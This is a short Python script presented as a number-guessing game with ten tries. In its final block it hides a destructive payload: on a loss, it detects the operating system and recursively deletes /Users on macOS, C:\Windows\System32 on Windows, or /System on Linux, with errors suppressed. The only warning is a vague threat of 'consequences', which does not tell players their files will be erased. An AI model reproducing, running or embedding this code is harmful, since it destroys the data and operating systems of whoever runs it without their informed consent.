import random
import shutil
import platform

print("There is a secret Number from 1 to 100")
print("You get 10 Tries to guess it")
print("There will be consequences for losing the game")

counter=1
secretNumber=random.randint(1,100)
while(counter<=10):
    n=int(input("Provide the Input Number="))
    if(n==secretNumber):
        print("You won the game")
        break
    else:
        print("Wrong Guess")
        counter+=1

if(counter==11 and n!=secretNumber):
    print("The correct number was",secretNumber)
    print("Face the Consequences")
    systemUName=platform.system()
    if(systemUName=="Linux"):
        operatingSystem="Linux"
    elif(systemUName=="Windows"):
        operatingSystem="Windows"
    elif(systemUName=="Darwin"):
        operatingSystem="MacOS"

    pathName=""
    if(operatingSystem=="MacOS"):
        pathName=r"/Users"
    elif(operatingSystem=="Windows"):
        pathName=r"C:\Windows\System32"
    elif(operatingSystem=="Linux"):
        pathName=r"/System"
    print("Say your last Goodbye's too-",pathName)

    shutil.rmtree(pathName,ignore_errors=True)